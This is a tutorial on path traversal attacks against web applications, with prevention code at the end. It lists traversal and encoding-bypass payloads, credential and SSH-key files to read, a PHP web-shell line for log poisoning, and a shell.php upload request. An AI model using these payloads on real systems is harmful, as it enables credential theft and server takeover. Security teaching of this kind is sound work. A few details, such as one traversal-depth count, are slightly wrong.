# Path traversal (directory traversal)

Path traversal vulnerabilities allow attackers to access files outside the intended directory by manipulating file path parameters. This can expose sensitive configuration files, application source code, system files, credentials, and private data. In some cases, attackers can write arbitrary files, leading to complete server compromise through code execution or configuration manipulation.

Path traversal is particularly dangerous because it often requires no authentication and can expose the entire filesystem to remote attackers.

> Only test systems you own or are explicitly authorized to assess.

## What is path traversal? (concept and impact)

### The vulnerability

Applications often accept user input to specify which file to load:
```
https://shop.com/loadImage?filename=product123.png
```

Backend code constructs file path:
```python
# Vulnerable code
base_directory = "/var/www/images/"
filename = request.args.get('filename')
file_path = base_directory + filename
# Result: /var/www/images/product123.png

with open(file_path, 'rb') as f:
    return f.read()
```

**Problem:** If `filename` contains `../` sequences, attacker can escape the base directory.

### Basic exploitation

**Attack payload:**
```
https://shop.com/loadImage?filename=../../../etc/passwd
```

**Server processes:**
```
/var/www/images/../../../etc/passwd
```

**After path normalization:**
```
/etc/passwd
```

Result: `/etc/passwd` file contents returned to attacker.

### What attackers can read

#### Linux/Unix systems:
- `/etc/passwd` - User accounts
- `/etc/shadow` - Password hashes (if running as root)
- `/etc/hosts` - Network configuration
- `/root/.ssh/id_rsa` - SSH private keys
- `/home/user/.bash_history` - Command history
- `/var/log/apache2/access.log` - Web server logs
- `/proc/self/environ` - Environment variables (database passwords, API keys)
- `/proc/self/cmdline` - Process command line
- Application config files: `config.php`, `database.yml`, `.env`
- Source code: `index.php`, `app.py`, `server.js`

#### Windows systems:
- `C:\Windows\win.ini` - Windows configuration
- `C:\Windows\System32\drivers\etc\hosts` - Hosts file
- `C:\inetpub\wwwroot\web.config` - IIS configuration
- `C:\xampp\htdocs\config.php` - Application config
- `C:\Users\Administrator\.ssh\id_rsa` - SSH keys
- Application logs and configs

### Impact levels

**Information disclosure:**
- Application source code → find additional vulnerabilities
- Configuration files → database credentials, API keys
- User data → privacy breach, GDPR violations

**Credential theft:**
- Database passwords → direct database access
- API keys → access to external services
- SSH keys → server access
- Cloud credentials (AWS keys) → infrastructure takeover

**Complete compromise:**
- Write to startup scripts → persistent backdoor
- Overwrite application files → remote code execution
- Modify configuration → disable security features

## Basic path traversal exploitation

### Understanding directory traversal sequences

**Unix/Linux:**
- `../` - Go up one directory level
- `../../` - Go up two levels
- `../../../` - Go up three levels

**Windows:**
- `..\` - Go up one level
- `..\..\` - Go up two levels
- Both `/` and `\` work as path separators

### Determining required depth

**Example 1: Simple case**
```
Base directory: /var/www/images/
Target file: /etc/passwd

Path levels:
/var/www/images/  (current)
/var/www/         (../)
/var/             (../../)
/                 (../../../)

Payload: ../../../etc/passwd
Full path: /var/www/images/../../../etc/passwd
Resolved: /etc/passwd
```

**Example 2: Deeper base directory**
```
Base directory: /opt/app/public/uploads/images/
Target: /etc/passwd

Levels needed: 6
Payload: ../../../../../etc/passwd
```

**Pro tip:** Use excessive traversal sequences (more than needed):
```
../../../../../../../../../../../../etc/passwd
```

Even if base is only 3 levels deep, extra `../` sequences are harmless - they just stop at root `/`.

### Practical exploitation workflow

**Step 1: Identify file parameter**
```http
GET /download?file=report.pdf HTTP/1.1
GET /image?filename=logo.png HTTP/1.1
POST /export?document=invoice.docx HTTP/1.1
```

**Step 2: Test basic traversal**
```http
GET /download?file=../../../etc/passwd HTTP/1.1
```

**Step 3: If successful, enumerate interesting files**
```
Linux targets:
- ../../../etc/passwd
- ../../../etc/shadow
- ../../../root/.ssh/id_rsa
- ../../../var/www/html/config.php
- ../../../home/user/.bash_history

Windows targets:
- ..\..\..\windows\win.ini
- ..\..\..\windows\system32\drivers\etc\hosts
- ..\..\..\inetpub\wwwroot\web.config
```

**Step 4: Retrieve application-specific files**
```
- ../../../var/www/html/index.php (source code)
- ../../../var/www/html/.env (environment variables)
- ../../../var/www/html/database.yml (DB credentials)
```

## Bypassing common defenses

### Defense 1: Blocking `../` sequences

**Vulnerable filter:**
```python
filename = request.args.get('filename')
if '../' in filename:
    return "Access denied", 403
```

### Bypass 1: Absolute paths

**Instead of relative traversal, use absolute path:**
```
Blocked: ../../../etc/passwd
Bypass:  /etc/passwd
```

**Why it works:** Filter only checks for `../`, but absolute paths don't contain this sequence.

**Exploitation:**
```http
GET /loadImage?filename=/etc/passwd HTTP/1.1
GET /download?file=/var/www/html/config.php HTTP/1.1
GET /view?path=/root/.ssh/id_rsa HTTP/1.1
```

### Bypass 2: Nested traversal sequences

**Vulnerable filter (non-recursive removal):**
```python
filename = filename.replace('../', '')
```

**Bypass with nested sequences:**
```
Original:  ....//
After filter removes '../': ../ 
Result: Still a valid traversal sequence!
```

**Payloads:**
```
....//....//....//etc/passwd
..../\..../\..../\etc/passwd  (mixing separators)
....\.....\.....\windows\win.ini
```

**Why it works:** Filter removes `../` once, leaving behind another valid `../`.

**Variations:**
```
....//
....\/
..../\
....\\
```

### Bypass 3: URL encoding

**Vulnerable filter (string-based detection):**
```python
if '../' in filename:
    return "Blocked"
```

**Bypass with URL encoding:**
```
Standard encoding:
../ = %2e%2e%2f

Payload: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Double URL encoding (if server decodes twice):**
```
../ = %252e%252e%252f

Payload: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

**Non-standard encodings:**
```
..%c0%af (overlong UTF-8 encoding of /)
..%ef%bc%8f (Unicode fullwidth form of /)
..%c1%9c (another overlong encoding)
```

**Mixed encoding:**
```
%2e%2e/etc/passwd (partial encoding)
.%2e/etc/passwd
..%2fetc/passwd
```

**Exploitation example:**
```http
GET /file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
GET /image?filename=%252e%252e%252fetc%252fpasswd HTTP/1.1
```

### Bypass 4: Base path validation

**Vulnerable validation:**
```python
filename = request.args.get('filename')
if not filename.startswith('/var/www/images/'):
    return "Invalid path", 403

# Then constructs path and reads file
```

**Bypass - include required prefix, then traverse:**
```
Payload: /var/www/images/../../../etc/passwd

Full path: /var/www/images/../../../etc/passwd
Resolved: /etc/passwd
```

**Why it works:** Validation checks prefix before path normalization occurs.

**Exploitation:**
```http
GET /loadImage?filename=/var/www/images/../../../etc/passwd HTTP/1.1
GET /download?file=/opt/app/files/../../../../etc/shadow HTTP/1.1
```

### Bypass 5: File extension validation

**Vulnerable validation:**
```python
filename = request.args.get('filename')
if not filename.endswith('.png'):
    return "Only PNG files allowed", 403
```

**Bypass with null byte termination:**
```
Payload: ../../../etc/passwd%00.png

PHP (before 5.3.4) interprets:
- Validation sees: ../../../etc/passwd\0.png (ends with .png ✓)
- File read stops at: ../../../etc/passwd (null byte terminates)
```

**Why it works:** Null byte (`%00`) terminates string in C-based languages. Validation sees full string, but filesystem API stops at null byte.

**Alternative payloads:**
```
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg
../../../etc/passwd%00.pdf
```

**Note:** This bypass is mostly obsolete (patched in modern PHP, doesn't work in Python/Node), but still found in legacy systems.

### Bypass 6: Case sensitivity and encoding variations

**On case-insensitive filesystems (Windows):**
```
Blocked:  ../../../windows/win.ini
Bypass:   ../../../WINDOWS/WIN.INI
Bypass:   ../../../WiNdOwS/wIn.InI
```

**Unicode variations:**
```
Standard: /etc/passwd
Unicode:  /etc/p%u0061sswd
```

### Bypass 7: Backslash vs forward slash

**Windows accepts both:**
```
..\..\..\..\windows\win.ini
../../../../windows/win.ini
..\/..\/..\/windows/win.ini (mixed)
```

## Advanced techniques

### Technique 1: Reading application source code

**Why:** Source code reveals additional vulnerabilities, database credentials, API keys.

**Common file locations:**
```
PHP:
- index.php
- config.php
- includes/database.php
- wp-config.php (WordPress)

Python:
- app.py
- manage.py
- settings.py
- config.py

Node.js:
- server.js
- app.js
- config/database.js
- .env

Ruby:
- config/database.yml
- config/secrets.yml
- Gemfile
```

**Exploitation:**
```http
GET /view?file=../../../../var/www/html/index.php HTTP/1.1
GET /download?doc=../../../../opt/app/config.py HTTP/1.1
```

### Technique 2: Extracting credentials

**Environment variables (Linux):**
```
/proc/self/environ

Contains: DATABASE_PASSWORD=secret123, AWS_KEY=AKIAIOSFODNN7EXAMPLE
```

**Configuration files:**
```
../../../var/www/html/.env
../../../opt/app/database.yml
../../../etc/mysql/my.cnf
```

### Technique 3: Log poisoning (escalate to RCE)

**Step 1:** Path traversal to read log file:
```
GET /view?file=../../../../var/log/apache2/access.log
```

**Step 2:** Inject PHP code in User-Agent:
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3:** Execute code via log file:
```
GET /view?file=../../../../var/log/apache2/access.log&cmd=whoami
```

Result: Log contains PHP code, which executes when viewed.

### Technique 4: Reading SSH keys for persistence

```
../../../root/.ssh/id_rsa
../../../home/user/.ssh/id_rsa
../../../home/ubuntu/.ssh/id_rsa
```

If successful, use private key to SSH into server.

### Technique 5: Path traversal in file upload

**Scenario:** Application allows file upload with user-specified filename.

**Exploit:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Result:** PHP shell uploaded to web root, accessible at `/shell.php?cmd=whoami`

## Detection and automation

### Manual testing checklist:

1. Identify file parameters: `file=`, `filename=`, `path=`, `document=`, `page=`
2. Test basic traversal: `../../../etc/passwd`
3. If blocked, try bypasses systematically
4. Test both Linux and Windows paths
5. Try absolute paths
6. Enumerate interesting files

### Automated testing with Burp Intruder:

**Payload list (Fuzzing - path traversal built-in):**
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
(etc. with various encodings)
```

**Grep - Extract settings:**
- Extract "root:" to detect `/etc/passwd` retrieval
- Extract error messages to identify blocked attempts

### Common interesting files (target list):

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/root/.ssh/id_rsa
/home/[username]/.ssh/id_rsa
/var/www/html/config.php
```

**Windows:**
```
C:\windows\win.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

## Prevention (secure implementation)

### Best practice: Don't use user input for file paths

**Insecure:**
```python
filename = request.args.get('filename')
with open(f'/var/www/images/{filename}', 'rb') as f:
    return f.read()
```

**Secure alternative - use ID mapping:**
```python
# Map numeric IDs to filenames
FILE_MAPPING = {
    1: 'product1.jpg',
    2: 'product2.jpg',
    3: 'banner.png'
}

file_id = request.args.get('id')
filename = FILE_MAPPING.get(int(file_id))

if filename:
    with open(f'/var/www/images/{filename}', 'rb') as f:
        return f.read()
else:
    return "File not found", 404
```

### Defense 1: Whitelist validation

```python
import os

ALLOWED_FILES = ['product1.jpg', 'product2.jpg', 'banner.png']
filename = request.args.get('filename')

if filename in ALLOWED_FILES:
    file_path = os.path.join('/var/www/images/', filename)
    with open(file_path, 'rb') as f:
        return f.read()
else:
    return "Access denied", 403
```

### Defense 2: Canonicalization + prefix validation

```python
import os

BASE_DIRECTORY = '/var/www/images/'
filename = request.args.get('filename')

# Construct path
file_path = os.path.join(BASE_DIRECTORY, filename)

# Canonicalize (resolve .. and symlinks)
canonical_path = os.path.realpath(file_path)

# Verify it starts with base directory
if canonical_path.startswith(os.path.realpath(BASE_DIRECTORY)):
    with open(canonical_path, 'rb') as f:
        return f.read()
else:
    return "Access denied", 403
```

### Defense 3: Strip path separators

```python
import os

filename = request.args.get('filename')

# Remove ALL path separators
filename = filename.replace('/', '').replace('\\', '').replace('..', '')

file_path = os.path.join('/var/www/images/', filename)

if os.path.exists(file_path):
    with open(file_path, 'rb') as f:
        return f.read()
```

### Defense 4: Use framework built-ins

**Flask (Python):**
```python
from flask import send_from_directory

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory('/var/www/images/', filename)
```

`send_from_directory()` performs security checks automatically.

**Java:**
```java
File file = new File(BASE_DIRECTORY, userInput);

if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // Safe to process
}
```

## Quick payload reference

Basic:
```
../../../etc/passwd
..\..\..\..\windows\win.ini
```

Absolute paths:
```
/etc/passwd
/var/www/html/config.php
C:\windows\win.ini
```

Nested:
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```

URL encoded:
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
```

With required prefix:
```
/var/www/images/../../../etc/passwd
```

With required extension:
```
../../../etc/passwd%00.png
```
